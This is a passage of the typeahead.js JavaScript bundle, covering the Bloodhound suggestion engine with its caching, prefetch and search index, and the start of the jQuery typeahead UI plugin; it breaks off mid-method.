    "function" == typeof define && define.amd ? define(["jquery"], (function (i) {
        return t.Bloodhound = e(i)
    })) : "object" == typeof exports ? module.exports = e(require("jquery")) : t.Bloodhound = e(t.jQuery)
}(this, (function (t) {
    var e = function () {
        "use strict";
        return {
            isMsie: function () {
                return !!/(msie|trident)/i.test(navigator.userAgent) && navigator.userAgent.match(/(msie |rv:)(\d+(.\d+)?)/i)[2]
            }, isBlankString: function (t) {
                return !t || /^\s*$/.test(t)
            }, escapeRegExChars: function (t) {
                return t.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&")
            }, isString: function (t) {
                return "string" == typeof t
            }, isNumber: function (t) {
                return "number" == typeof t
            }, isArray: t.isArray, isFunction: t.isFunction, isObject: t.isPlainObject, isUndefined: function (t) {
                return void 0 === t
            }, isElement: function (t) {
                return !(!t || 1 !== t.nodeType)
            }, isJQuery: function (e) {
                return e instanceof t
            }, toStr: function (t) {
                return e.isUndefined(t) || null === t ? "" : t + ""
            }, bind: t.proxy, each: function (e, i) {
                t.each(e, (function (t, e) {
                    return i(e, t)
                }))
            }, map: t.map, filter: t.grep, every: function (e, i) {
                var n = !0;
                return e ? (t.each(e, (function (t, o) {
                    if (!(n = i.call(null, o, t, e))) return !1
                })), !!n) : n
            }, some: function (e, i) {
                var n = !1;
                return e ? (t.each(e, (function (t, o) {
                    if (n = i.call(null, o, t, e)) return !1
                })), !!n) : n
            }, mixin: t.extend, identity: function (t) {
                return t
            }, clone: function (e) {
                return t.extend(!0, {}, e)
            }, getIdGenerator: function () {
                var t = 0;
                return function () {
                    return t++
                }
            }, templatify: function (e) {
                return t.isFunction(e) ? e : function () {
                    return String(e)
                }
            }, defer: function (t) {
                setTimeout(t, 0)
            }, debounce: function (t, e, i) {
                var n, o;
                return function () {
                    var s, r, a = this, l = arguments;
                    return s = function () {
                        n = null, i || (o = t.apply(a, l))
                    }, r = i && !n, clearTimeout(n), n = setTimeout(s, e), r && (o = t.apply(a, l)), o
                }
            }, throttle: function (t, e) {
                var i, n, o, s, r, a;
                return r = 0, a = function () {
                    r = new Date, o = null, s = t.apply(i, n)
                }, function () {
                    var l = new Date, c = e - (l - r);
                    return i = this, n = arguments, c <= 0 ? (clearTimeout(o), o = null, r = l, s = t.apply(i, n)) : o || (o = setTimeout(a, c)), s
                }
            }, stringify: function (t) {
                return e.isString(t) ? t : JSON.stringify(t)
            }, guid: function () {
                function t(t) {
                    var e = (Math.random().toString(16) + "000000000").substr(2, 8);
                    return t ? "-" + e.substr(0, 4) + "-" + e.substr(4, 4) : e
                }

                return "tt-" + t() + t(!0) + t(!0) + t()
            }, noop: function () {
            }
        }
    }(), i = function () {
        "use strict";

        function t(t) {
            return (t = e.toStr(t)) ? t.split(/\s+/) : []
        }

        function i(t) {
            return (t = e.toStr(t)) ? t.split(/\W+/) : []
        }

        function n(t) {
            t = e.toStr(t);
            var i = [], n = "";
            return e.each(t.split(""), (function (t) {
                t.match(/\s+/) ? n = "" : (i.push(n + t), n += t)
            })), i
        }

        function o(t) {
            return function (i) {
                return i = e.isArray(i) ? i : [].slice.call(arguments, 0), function (n) {
                    var o = [];
                    return e.each(i, (function (i) {
                        o = o.concat(t(e.toStr(n[i])))
                    })), o
                }
            }
        }

        return {nonword: i, whitespace: t, ngram: n, obj: {nonword: o(i), whitespace: o(t), ngram: o(n)}}
    }(), n = function () {
        "use strict";

        function i(i) {
            this.maxSize = e.isNumber(i) ? i : 100, this.reset(), this.maxSize <= 0 && (this.set = this.get = t.noop)
        }

        function n() {
            this.head = this.tail = null
        }

        function o(t, e) {
            this.key = t, this.val = e, this.prev = this.next = null
        }

        return e.mixin(i.prototype, {
            set: function (t, e) {
                var i, n = this.list.tail;
                this.size >= this.maxSize && (this.list.remove(n), delete this.hash[n.key], this.size--), (i = this.hash[t]) ? (i.val = e, this.list.moveToFront(i)) : (i = new o(t, e), this.list.add(i), this.hash[t] = i, this.size++)
            }, get: function (t) {
                var e = this.hash[t];
                if (e) return this.list.moveToFront(e), e.val
            }, reset: function () {
                this.size = 0, this.hash = {}, this.list = new n
            }
        }), e.mixin(n.prototype, {
            add: function (t) {
                this.head && (t.next = this.head, this.head.prev = t), this.head = t, this.tail = this.tail || t
            }, remove: function (t) {
                t.prev ? t.prev.next = t.next : this.head = t.next, t.next ? t.next.prev = t.prev : this.tail = t.prev
            }, moveToFront: function (t) {
                this.remove(t), this.add(t)
            }
        }), i
    }(), o = function () {
        "use strict";

        function i(t, i) {
            this.prefix = ["__", t, "__"].join(""), this.ttlKey = "__ttl__", this.keyMatcher = new RegExp("^" + e.escapeRegExChars(this.prefix)), this.ls = i || r, !this.ls && this._noop()
        }

        function n() {
            return (new Date).getTime()
        }

        function o(t) {
            return JSON.stringify(e.isUndefined(t) ? null : t)
        }

        function s(e) {
            return t.parseJSON(e)
        }

        var r;
        try {
            (r = window.localStorage).setItem("~~~", "!"), r.removeItem("~~~")
        } catch (t) {
            r = null
        }
        return e.mixin(i.prototype, {
            _prefix: function (t) {
                return this.prefix + t
            }, _ttlKey: function (t) {
                return this._prefix(t) + this.ttlKey
            }, _noop: function () {
                this.get = this.set = this.remove = this.clear = this.isExpired = e.noop
            }, _safeSet: function (t, e) {
                try {
                    this.ls.setItem(t, e)
                } catch (t) {
                    "QuotaExceededError" === t.name && (this.clear(), this._noop())
                }
            }, get: function (t) {
                return this.isExpired(t) && this.remove(t), s(this.ls.getItem(this._prefix(t)))
            }, set: function (t, i, s) {
                return e.isNumber(s) ? this._safeSet(this._ttlKey(t), o(n() + s)) : this.ls.removeItem(this._ttlKey(t)), this._safeSet(this._prefix(t), o(i))
            }, remove: function (t) {
                return this.ls.removeItem(this._ttlKey(t)), this.ls.removeItem(this._prefix(t)), this
            }, clear: function () {
                var t, e = function (t) {
                    var e, i, n = [], o = r.length;
                    for (e = 0; e < o; e++) (i = r.key(e)).match(t) && n.push(i.replace(t, ""));
                    return n
                }(this.keyMatcher);
                for (t = e.length; t--;) this.remove(e[t]);
                return this
            }, isExpired: function (t) {
                var i = s(this.ls.getItem(this._ttlKey(t)));
                return !!(e.isNumber(i) && n() > i)
            }
        }), i
    }(), s = function () {
        "use strict";

        function i(t) {
            t = t || {}, this.maxPendingRequests = t.maxPendingRequests || 6, this.cancelled = !1, this.lastReq = null, this._send = t.transport, this._get = t.limiter ? t.limiter(this._get) : this._get, this._cache = !1 === t.cache ? new n(0) : r
        }

        var o = 0, s = {}, r = new n(10);
        return i.setMaxPendingRequests = function (t) {
            this.maxPendingRequests = t
        }, i.resetCache = function () {
            r.reset()
        }, e.mixin(i.prototype, {
            _fingerprint: function (e) {
                return (e = e || {}).url + e.type + t.param(e.data || {})
            }, _get: function (t, e) {
                function i(t) {
                    e(null, t), c._cache.set(a, t)
                }

                function n() {
                    e(!0)
                }

                function r() {
                    o--, delete s[a], c.onDeckRequestArgs && (c._get.apply(c, c.onDeckRequestArgs), c.onDeckRequestArgs = null)
                }

                var a, l, c = this;
                a = this._fingerprint(t), this.cancelled || a !== this.lastReq || ((l = s[a]) ? l.done(i).fail(n) : o < this.maxPendingRequests ? (o++, s[a] = this._send(t).done(i).fail(n).always(r)) : this.onDeckRequestArgs = [].slice.call(arguments, 0))
            }, get: function (i, n) {
                var o, s;
                n = n || t.noop, i = e.isString(i) ? {url: i} : i || {}, s = this._fingerprint(i), this.cancelled = !1, this.lastReq = s, (o = this._cache.get(s)) ? n(null, o) : this._get(i, n)
            }, cancel: function () {
                this.cancelled = !0
            }
        }), i
    }(), r = window.SearchIndex = function () {
        "use strict";

        function i(i) {
            (i = i || {}).datumTokenizer && i.queryTokenizer || t.error("datumTokenizer and queryTokenizer are both required"), this.identify = i.identify || e.stringify, this.datumTokenizer = i.datumTokenizer, this.queryTokenizer = i.queryTokenizer, this.matchAnyQueryToken = i.matchAnyQueryToken, this.reset()
        }

        function n(t) {
            return t = e.filter(t, (function (t) {
                return !!t
            })), e.map(t, (function (t) {
                return t.toLowerCase()
            }))
        }

        function o() {
            var t = {};
            return t[r] = [], t[s] = {}, t
        }

        var s = "c", r = "i";
        return e.mixin(i.prototype, {
            bootstrap: function (t) {
                this.datums = t.datums, this.trie = t.trie
            }, add: function (t) {
                var i = this;
                t = e.isArray(t) ? t : [t], e.each(t, (function (t) {
                    var a, l;
                    i.datums[a = i.identify(t)] = t, l = n(i.datumTokenizer(t)), e.each(l, (function (t) {
                        var e, n, l;
                        for (e = i.trie, n = t.split(""); l = n.shift();) (e = e[s][l] || (e[s][l] = o()))[r].push(a)
                    }))
                }))
            }, get: function (t) {
                var i = this;
                return e.map(t, (function (t) {
                    return i.datums[t]
                }))
            }, search: function (t) {
                var i, o, a = this;
                return i = n(this.queryTokenizer(t)), e.each(i, (function (t) {
                    var e, i, n, l;
                    if (o && 0 === o.length && !a.matchAnyQueryToken) return !1;
                    for (e = a.trie, i = t.split(""); e && (n = i.shift());) e = e[s][n];
                    if (e && 0 === i.length) l = e[r].slice(0), o = o ? function (t, e) {
                        var i = 0, n = 0, o = [];
                        t = t.sort(), e = e.sort();
                        for (var s = t.length, r = e.length; i < s && n < r;) t[i] < e[n] ? i++ : (t[i] > e[n] || (o.push(t[i]), i++), n++);
                        return o
                    }(o, l) : l; else if (!a.matchAnyQueryToken) return o = [], !1
                })), o ? e.map(function (t) {
                    for (var e = {}, i = [], n = 0, o = t.length; n < o; n++) e[t[n]] || (e[t[n]] = !0, i.push(t[n]));
                    return i
                }(o), (function (t) {
                    return a.datums[t]
                })) : []
            }, all: function () {
                var t = [];
                for (var e in this.datums) t.push(this.datums[e]);
                return t
            }, reset: function () {
                this.datums = {}, this.trie = o()
            }, serialize: function () {
                return {datums: this.datums, trie: this.trie}
            }
        }), i
    }(), a = function () {
        "use strict";

        function t(t) {
            this.url = t.url, this.ttl = t.ttl, this.cache = t.cache, this.prepare = t.prepare, this.transform = t.transform, this.transport = t.transport, this.thumbprint = t.thumbprint, this.storage = new o(t.cacheKey)
        }

        var i;
        return i = {
            data: "data",
            protocol: "protocol",
            thumbprint: "thumbprint"
        }, e.mixin(t.prototype, {
            _settings: function () {
                return {url: this.url, type: "GET", dataType: "json"}
            }, store: function (t) {
                this.cache && (this.storage.set(i.data, t, this.ttl), this.storage.set(i.protocol, location.protocol, this.ttl), this.storage.set(i.thumbprint, this.thumbprint, this.ttl))
            }, fromCache: function () {
                var t, e = {};
                return this.cache ? (e.data = this.storage.get(i.data), e.protocol = this.storage.get(i.protocol), e.thumbprint = this.storage.get(i.thumbprint), t = e.thumbprint !== this.thumbprint || e.protocol !== location.protocol, e.data && !t ? e.data : null) : null
            }, fromNetwork: function (t) {
                var e, i = this;
                t && (e = this.prepare(this._settings()), this.transport(e).fail((function () {
                    t(!0)
                })).done((function (e) {
                    t(null, i.transform(e))
                })))
            }, clear: function () {
                return this.storage.clear(), this
            }
        }), t
    }(), l = function () {
        "use strict";

        function t(t) {
            this.url = t.url, this.prepare = t.prepare, this.transform = t.transform, this.indexResponse = t.indexResponse, this.transport = new s({
                cache: t.cache,
                limiter: t.limiter,
                transport: t.transport,
                maxPendingRequests: t.maxPendingRequests
            })
        }

        return e.mixin(t.prototype, {
            _settings: function () {
                return {url: this.url, type: "GET", dataType: "json"}
            }, get: function (t, e) {
                var i, n = this;
                if (e) return t = t || "", i = this.prepare(t, this._settings()), this.transport.get(i, (function (t, i) {
                    e(t ? [] : n.transform(i))
                }))
            }, cancelLastRequest: function () {
                this.transport.cancel()
            }
        }), t
    }(), c = function () {
        "use strict";

        function i(i) {
            var n;
            return i ? (n = {
                url: null,
                ttl: 864e5,
                cache: !0,
                cacheKey: null,
                thumbprint: "",
                prepare: e.identity,
                transform: e.identity,
                transport: null
            }, i = e.isString(i) ? {url: i} : i, !(i = e.mixin(n, i)).url && t.error("prefetch requires url to be set"), i.transform = i.filter || i.transform, i.cacheKey = i.cacheKey || i.url, i.thumbprint = "1.2.0" + i.thumbprint, i.transport = i.transport ? o(i.transport) : t.ajax, i) : null
        }

        function n(i) {
            var n;
            if (i) return n = {
                url: null,
                cache: !0,
                prepare: null,
                replace: null,
                wildcard: null,
                limiter: null,
                rateLimitBy: "debounce",
                rateLimitWait: 300,
                transform: e.identity,
                transport: null
            }, i = e.isString(i) ? {url: i} : i, !(i = e.mixin(n, i)).url && t.error("remote requires url to be set"), i.transform = i.filter || i.transform, i.prepare = function (t) {
                function e(t, e) {
                    return e.url = s(e.url, t), e
                }

                function i(t, e) {
                    return e.url = e.url.replace(r, encodeURIComponent(t)), e
                }

                function n(t, e) {
                    return e
                }

                var o, s, r;
                return o = t.prepare, s = t.replace, r = t.wildcard, o || (o = s ? e : t.wildcard ? i : n)
            }(i), i.limiter = function (t) {
                function i(t) {
                    return function (i) {
                        return e.debounce(i, t)
                    }
                }

                function n(t) {
                    return function (i) {
                        return e.throttle(i, t)
                    }
                }

                var o, s, r;
                return o = t.limiter, s = t.rateLimitBy, r = t.rateLimitWait, o || (o = /^throttle$/i.test(s) ? n(r) : i(r)), o
            }(i), i.transport = i.transport ? o(i.transport) : t.ajax, delete i.replace, delete i.wildcard, delete i.rateLimitBy, delete i.rateLimitWait, i
        }

        function o(i) {
            return function (n) {
                var o = t.Deferred();
                return i(n, (function (t) {
                    e.defer((function () {
                        o.resolve(t)
                    }))
                }), (function (t) {
                    e.defer((function () {
                        o.reject(t)
                    }))
                })), o
            }
        }

        return function (o) {
            var s, r;
            return s = {
                initialize: !0,
                identify: e.stringify,
                datumTokenizer: null,
                queryTokenizer: null,
                matchAnyQueryToken: !1,
                sufficient: 5,
                indexRemote: !1,
                sorter: null,
                local: [],
                prefetch: null,
                remote: null
            }, !(o = e.mixin(s, o || {})).datumTokenizer && t.error("datumTokenizer is required"), !o.queryTokenizer && t.error("queryTokenizer is required"), r = o.sorter, o.sorter = r ? function (t) {
                return t.sort(r)
            } : e.identity, o.local = e.isFunction(o.local) ? o.local() : o.local, o.prefetch = i(o.prefetch), o.remote = n(o.remote), o
        }
    }();
    return function () {
        "use strict";

        function n(t) {
            t = c(t), this.sorter = t.sorter, this.identify = t.identify, this.sufficient = t.sufficient, this.indexRemote = t.indexRemote, this.local = t.local, this.remote = t.remote ? new l(t.remote) : null, this.prefetch = t.prefetch ? new a(t.prefetch) : null, this.index = new r({
                identify: this.identify,
                datumTokenizer: t.datumTokenizer,
                queryTokenizer: t.queryTokenizer
            }), !1 !== t.initialize && this.initialize()
        }

        var o;
        return o = window && window.Bloodhound, n.noConflict = function () {
            return window && (window.Bloodhound = o), n
        }, n.tokenizers = i, e.mixin(n.prototype, {
            __ttAdapter: function () {
                var t = this;
                return this.remote ? function (e, i, n) {
                    return t.search(e, i, n)
                } : function (e, i) {
                    return t.search(e, i)
                }
            }, _loadPrefetch: function () {
                var e, i, n = this;
                return e = t.Deferred(), this.prefetch ? (i = this.prefetch.fromCache()) ? (this.index.bootstrap(i), e.resolve()) : this.prefetch.fromNetwork((function (t, i) {
                    return t ? e.reject() : (n.add(i), n.prefetch.store(n.index.serialize()), void e.resolve())
                })) : e.resolve(), e.promise()
            }, _initialize: function () {
                var t = this;
                return this.clear(), (this.initPromise = this._loadPrefetch()).done((function () {
                    t.add(t.local)
                })), this.initPromise
            }, initialize: function (t) {
                return !this.initPromise || t ? this._initialize() : this.initPromise
            }, add: function (t) {
                return this.index.add(t), this
            }, get: function (t) {
                return t = e.isArray(t) ? t : [].slice.call(arguments), this.index.get(t)
            }, search: function (t, i, n) {
                var o, s = this;
                return i = i || e.noop, n = n || e.noop, o = this.sorter(this.index.search(t)), i(this.remote ? o.slice() : o), this.remote && o.length < this.sufficient ? this.remote.get(t, (function (t) {
                    var i = [];
                    e.each(t, (function (t) {
                        !e.some(o, (function (e) {
                            return s.identify(t) === s.identify(e)
                        })) && i.push(t)
                    })), s.indexRemote && s.add(i), n(i)
                })) : this.remote && this.remote.cancelLastRequest(), this
            }, all: function () {
                return this.index.all()
            }, clear: function () {
                return this.index.reset(), this
            }, clearPrefetchCache: function () {
                return this.prefetch && this.prefetch.clear(), this
            }, clearRemoteCache: function () {
                return s.resetCache(), this
            }, ttAdapter: function () {
                return this.__ttAdapter()
            }
        }), n
    }()
})), function (t, e) {
    "function" == typeof define && define.amd ? define(["jquery"], (function (t) {
        return e(t)
    })) : "object" == typeof exports ? module.exports = e(require("jquery")) : e(t.jQuery)
}(this, (function (t) {
    var e = function () {
        "use strict";
        return {
            isMsie: function () {
                return !!/(msie|trident)/i.test(navigator.userAgent) && navigator.userAgent.match(/(msie |rv:)(\d+(.\d+)?)/i)[2]
            }, isBlankString: function (t) {
                return !t || /^\s*$/.test(t)
            }, escapeRegExChars: function (t) {
                return t.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&")
            }, isString: function (t) {
                return "string" == typeof t
            }, isNumber: function (t) {
                return "number" == typeof t
            }, isArray: t.isArray, isFunction: t.isFunction, isObject: t.isPlainObject, isUndefined: function (t) {
                return void 0 === t
            }, isElement: function (t) {
                return !(!t || 1 !== t.nodeType)
            }, isJQuery: function (e) {
                return e instanceof t
            }, toStr: function (t) {
                return e.isUndefined(t) || null === t ? "" : t + ""
            }, bind: t.proxy, each: function (e, i) {
                t.each(e, (function (t, e) {
                    return i(e, t)
                }))
            }, map: t.map, filter: t.grep, every: function (e, i) {
                var n = !0;
                return e ? (t.each(e, (function (t, o) {
                    if (!(n = i.call(null, o, t, e))) return !1
                })), !!n) : n
            }, some: function (e, i) {
                var n = !1;
                return e ? (t.each(e, (function (t, o) {
                    if (n = i.call(null, o, t, e)) return !1
                })), !!n) : n
            }, mixin: t.extend, identity: function (t) {
                return t
            }, clone: function (e) {
                return t.extend(!0, {}, e)
            }, getIdGenerator: function () {
                var t = 0;
                return function () {
                    return t++
                }
            }, templatify: function (e) {
                return t.isFunction(e) ? e : function () {
                    return String(e)
                }
            }, defer: function (t) {
                setTimeout(t, 0)
            }, debounce: function (t, e, i) {
                var n, o;
                return function () {
                    var s, r, a = this, l = arguments;
                    return s = function () {
                        n = null, i || (o = t.apply(a, l))
                    }, r = i && !n, clearTimeout(n), n = setTimeout(s, e), r && (o = t.apply(a, l)), o
                }
            }, throttle: function (t, e) {
                var i, n, o, s, r, a;
                return r = 0, a = function () {
                    r = new Date, o = null, s = t.apply(i, n)
                }, function () {
                    var l = new Date, c = e - (l - r);
                    return i = this, n = arguments, c <= 0 ? (clearTimeout(o), o = null, r = l, s = t.apply(i, n)) : o || (o = setTimeout(a, c)), s
                }
            }, stringify: function (t) {
                return e.isString(t) ? t : JSON.stringify(t)
            }, guid: function () {
                function t(t) {
                    var e = (Math.random().toString(16) + "000000000").substr(2, 8);
                    return t ? "-" + e.substr(0, 4) + "-" + e.substr(4, 4) : e
                }

                return "tt-" + t() + t(!0) + t(!0) + t()
            }, noop: function () {
            }
        }
    }(), i = function () {
        "use strict";

        function t(t) {
            return {
                wrapper: '<span class="' + t.wrapper + '"></span>',
                menu: '<div role="listbox" class="' + t.menu + '"></div>'
            }
        }

        function i(t) {
            var i = {};
            return e.each(t, (function (t, e) {
                i[e] = "." + t
            })), i
        }

        function n() {
            var t = {
                wrapper: {position: "relative", display: "inline-block"},
                hint: {
                    position: "absolute",
                    top: "0",
                    left: "0",
                    borderColor: "transparent",
                    boxShadow: "none",
                    opacity: "1"
                },
                input: {position: "relative", verticalAlign: "top", backgroundColor: "transparent"},
                inputWithNoHint: {position: "relative", verticalAlign: "top"},
                menu: {position: "absolute", top: "100%", left: "0", zIndex: "100", display: "none"},
                ltr: {left: "0", right: "auto"},
                rtl: {left: "auto", right: " 0"}
            };
            return e.isMsie() && e.mixin(t.input, {backgroundImage: "url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)"}), t
        }

        var o = {
            wrapper: "twitter-typeahead",
            input: "tt-input",
            hint: "tt-hint",
            menu: "tt-menu",
            dataset: "tt-dataset",
            suggestion: "tt-suggestion",
            selectable: "tt-selectable",
            empty: "tt-empty",
            open: "tt-open",
            cursor: "tt-cursor",
            highlight: "tt-highlight"
        };
        return function (s) {
            var r, a;
            return a = e.mixin({}, o, s), {
                css: (r = {css: n(), classes: a, html: t(a), selectors: i(a)}).css,
                html: r.html,
                classes: r.classes,
                selectors: r.selectors,
                mixin: function (t) {
                    e.mixin(t, r)
                }
            }
        }
    }(), n = function () {
        "use strict";

        function i(e) {
            e && e.el || t.error("EventBus initialized without el"), this.$el = t(e.el)
        }

        var n;
        return "typeahead:", n = {
            render: "rendered",
            cursorchange: "cursorchanged",
            select: "selected",
            autocomplete: "autocompleted"
        }, e.mixin(i.prototype, {
            _trigger: function (e, i) {
                var n = t.Event("typeahead:" + e);
                return this.$el.trigger.call(this.$el, n, i || []), n
            }, before: function (t) {
                var e;
                return e = [].slice.call(arguments, 1), this._trigger("before" + t, e).isDefaultPrevented()
            }, trigger: function (t) {
                var e;
                this._trigger(t, [].slice.call(arguments, 1)), (e = n[t]) && this._trigger(e, [].slice.call(arguments, 1))
            }
        }), i
    }(), o = function () {
        "use strict";

        function t(t, e, n, o) {
            var s;
            if (!n) return this;
            for (e = e.split(i), n = o ? function (t, e) {
                return t.bind ? t.bind(e) : function () {
                    t.apply(e, [].slice.call(arguments, 0))
                }
            }(n, o) : n, this._callbacks = this._callbacks || {}; s = e.shift();) this._callbacks[s] = this._callbacks[s] || {
                sync: [],
                async: []
            }, this._callbacks[s][t].push(n);
            return this
        }

        function e(t, e, i) {
            return function () {
                for (var n, o = 0, s = t.length; !n && o < s; o += 1) n = !1 === t[o].apply(e, i);
                return !n
            }
        }

        var i = /\s+/, n = window.setImmediate ? function (t) {
            setImmediate((function () {
                t()
            }))
        } : function (t) {
            setTimeout((function () {
                t()
            }), 0)
        };
        return {
            onSync: function (e, i, n) {
                return t.call(this, "sync", e, i, n)
            }, onAsync: function (e, i, n) {
                return t.call(this, "async", e, i, n)
            }, off: function (t) {
                var e;
                if (!this._callbacks) return this;
                for (t = t.split(i); e = t.shift();) delete this._callbacks[e];
                return this
            }, trigger: function (t) {
                var o, s, r, a, l;
                if (!this._callbacks) return this;
                for (t = t.split(i), r = [].slice.call(arguments, 1); (o = t.shift()) && (s = this._callbacks[o]);) a = e(s.sync, this, [o].concat(r)), l = e(s.async, this, [o].concat(r)), a() && n(l);
                return this
            }
        }
    }(), s = function (t) {
        "use strict";

        function i(t) {
            return s[t.toUpperCase()] || t
        }

        function n(t, n, o, s) {
            for (var r, a = [], l = 0, c = t.length; l < c; l++) {
                var d = e.escapeRegExChars(t[l]);
                s && (d = d.replace(/\S/g, i)), a.push(d)
            }
            return r = o ? "\\b(" + a.join("|") + ")\\b" : "(" + a.join("|") + ")", n ? new RegExp(r) : new RegExp(r, "i")
        }

        var o = {
            node: null,
            pattern: null,
            tagName: "strong",
            className: null,
            wordsOnly: !1,
            caseSensitive: !1,
            diacriticInsensitive: !1
        }, s = {
            A: "[AaªÀ-Åà-åĀ-ąǍǎȀ-ȃȦȧᴬᵃḀḁẚẠ-ảₐ℀℁℻⒜Ⓐⓐ㍱-㍴㎀-㎄㎈㎉㎩-㎯㏂㏊㏟㏿Ａａ]",
            B: "[BbᴮᵇḂ-ḇℬ⒝Ⓑⓑ㍴㎅-㎇㏃㏈㏔㏝Ｂｂ]",
            C: "[CcÇçĆ-čᶜ℀ℂ℃℅℆ℭⅭⅽ⒞Ⓒⓒ㍶㎈㎉㎝㎠㎤㏄-㏇Ｃｃ]",
            D: "[DdĎďǄ-ǆǱ-ǳᴰᵈḊ-ḓⅅⅆⅮⅾ⒟Ⓓⓓ㋏㍲㍷-㍹㎗㎭-㎯㏅㏈Ｄｄ]",
            E: "[EeÈ-Ëè-ëĒ-ěȄ-ȇȨȩᴱᵉḘ-ḛẸ-ẽₑ℡ℯℰⅇ⒠Ⓔⓔ㉐㋍㋎Ｅｅ]",
            F: "[FfᶠḞḟ℉ℱ℻⒡Ⓕⓕ㎊-㎌㎙ﬀ-ﬄＦｆ]",
            G: "[GgĜ-ģǦǧǴǵᴳᵍḠḡℊ⒢Ⓖⓖ㋌㋍㎇㎍-㎏㎓㎬㏆㏉㏒㏿Ｇｇ]",
            H: "[HhĤĥȞȟʰᴴḢ-ḫẖℋ-ℎ⒣Ⓗⓗ㋌㍱㎐-㎔㏊㏋㏗Ｈｈ]",
            I: "[IiÌ-Ïì-ïĨ-İĲĳǏǐȈ-ȋᴵᵢḬḭỈ-ịⁱℐℑℹⅈⅠ-ⅣⅥ-ⅨⅪⅫⅰ-ⅳⅵ-ⅸⅺⅻ⒤Ⓘⓘ㍺㏌㏕ﬁﬃＩｉ]",
            J: "[JjĲ-ĵǇ-ǌǰʲᴶⅉ⒥ⒿⓙⱼＪｊ]",
            K: "[KkĶķǨǩᴷᵏḰ-ḵK⒦Ⓚⓚ㎄㎅㎉㎏㎑㎘㎞㎢㎦㎪㎸㎾㏀㏆㏍-㏏Ｋｋ]",
            L: "[LlĹ-ŀǇ-ǉˡᴸḶḷḺ-ḽℒℓ℡Ⅼⅼ⒧Ⓛⓛ㋏㎈㎉㏐-㏓㏕㏖㏿ﬂﬄＬｌ]",
            M: "[MmᴹᵐḾ-ṃ℠™ℳⅯⅿ⒨Ⓜⓜ㍷-㍹㎃㎆㎎㎒㎖㎙-㎨㎫㎳㎷㎹㎽㎿㏁㏂㏎㏐㏔-㏖㏘㏙㏞㏟Ｍｍ]",
            N: "[NnÑñŃ-ŉǊ-ǌǸǹᴺṄ-ṋⁿℕ№⒩Ⓝⓝ㎁㎋㎚㎱㎵㎻㏌㏑Ｎｎ]",
            O: "[OoºÒ-Öò-öŌ-őƠơǑǒǪǫȌ-ȏȮȯᴼᵒỌ-ỏₒ℅№ℴ⒪Ⓞⓞ㍵㏇㏒㏖Ｏｏ]",
            P: "[PpᴾᵖṔ-ṗℙ⒫Ⓟⓟ㉐㍱㍶㎀㎊㎩-㎬㎰㎴㎺㏋㏗-㏚Ｐｐ]",
            Q: "[Qqℚ⒬Ⓠⓠ㏃Ｑｑ]",
            R: "[RrŔ-řȐ-ȓʳᴿᵣṘ-ṛṞṟ₨ℛ-ℝ⒭Ⓡⓡ㋍㍴㎭-㎯㏚㏛Ｒｒ]",
            S: "[SsŚ-šſȘșˢṠ-ṣ₨℁℠⒮Ⓢⓢ㎧㎨㎮-㎳㏛㏜ﬆＳｓ]",
            T: "[TtŢ-ťȚțᵀᵗṪ-ṱẗ℡™⒯Ⓣⓣ㉐㋏㎔㏏ﬅﬆＴｔ]",
            U: "[UuÙ-Üù-üŨ-ųƯưǓǔȔ-ȗᵁᵘᵤṲ-ṷỤ-ủ℆⒰Ⓤⓤ㍳㍺Ｕｕ]",
            V: "[VvᵛᵥṼ-ṿⅣ-Ⅷⅳ-ⅷ⒱Ⓥⓥⱽ㋎㍵㎴-㎹㏜㏞Ｖｖ]",
            W: "[WwŴŵʷᵂẀ-ẉẘ⒲Ⓦⓦ㎺-㎿㏝Ｗｗ]",
            X: "[XxˣẊ-ẍₓ℻Ⅸ-Ⅻⅸ-ⅻ⒳Ⓧⓧ㏓Ｘｘ]",
            Y: "[YyÝýÿŶ-ŸȲȳʸẎẏẙỲ-ỹ⒴Ⓨⓨ㏉Ｙｙ]",
            Z: "[ZzŹ-žǱ-ǳᶻẐ-ẕℤℨ⒵Ⓩⓩ㎐-㎔Ｚｚ]"
        };
        return function (i) {
            var s;
            (i = e.mixin({}, o, i)).node && i.pattern && (i.pattern = e.isArray(i.pattern) ? i.pattern : [i.pattern], s = n(i.pattern, i.caseSensitive, i.wordsOnly, i.diacriticInsensitive), function t(e, i) {
                for (var n, o = 0; o < e.childNodes.length; o++) 3 === (n = e.childNodes[o]).nodeType ? o += i(n) ? 1 : 0 : t(n, i)
            }(i.node, (function (e) {
                var n, o, r;
                return (n = s.exec(e.data)) && (r = t.createElement(i.tagName), i.className && (r.className = i.className), (o = e.splitText(n.index)).splitText(n[0].length), r.appendChild(o.cloneNode(!0)), e.parentNode.replaceChild(r, o)), !!n
            })))
        }
    }(window.document), r = function () {
        "use strict";

        function i(i, n) {
            (i = i || {}).input || t.error("input is missing"), n.mixin(this), this.$hint = t(i.hint), this.$input = t(i.input), this.$input.attr({
                "aria-activedescendant": "",
                "aria-owns": this.$input.attr("id") + "_listbox",
                role: "combobox",
                "aria-readonly": "true",
                "aria-autocomplete": "list"
            }), t(n.menu).attr("id", this.$input.attr("id") + "_listbox"), this.query = this.$input.val(), this.queryWhenFocused = this.hasFocus() ? this.query : null, this.$overflowHelper = function (e) {
                return t('<pre aria-hidden="true"></pre>').css({
                    position: "absolute",
                    visibility: "hidden",
                    whiteSpace: "pre",
                    fontFamily: e.css("font-family"),
                    fontSize: e.css("font-size"),
                    fontStyle: e.css("font-style"),
                    fontVariant: e.css("font-variant"),
                    fontWeight: e.css("font-weight"),
                    wordSpacing: e.css("word-spacing"),
                    letterSpacing: e.css("letter-spacing"),
                    textIndent: e.css("text-indent"),
                    textRendering: e.css("text-rendering"),
                    textTransform: e.css("text-transform")
                }).insertAfter(e)
            }(this.$input), this._checkLanguageDirection(), 0 === this.$hint.length && (this.setHint = this.getHint = this.clearHint = this.clearHintIfInvalid = e.noop), this.onSync("cursorchange", this._updateDescendent)
        }

        function n(t, e) {
            return i.normalizeQuery(t) === i.normalizeQuery(e)
        }

        function s(t) {
            return t.altKey || t.ctrlKey || t.metaKey || t.shiftKey
        }

        var r;
        return r = {
            9: "tab",
            27: "esc",
            37: "left",
            39: "right",
            13: "enter",
            38: "up",
            40: "down"
        }, i.normalizeQuery = function (t) {
            return e.toStr(t).replace(/^\s*/g, "").replace(/\s{2,}/g, " ")
        }, e.mixin(i.prototype, o, {
            _onBlur: function () {
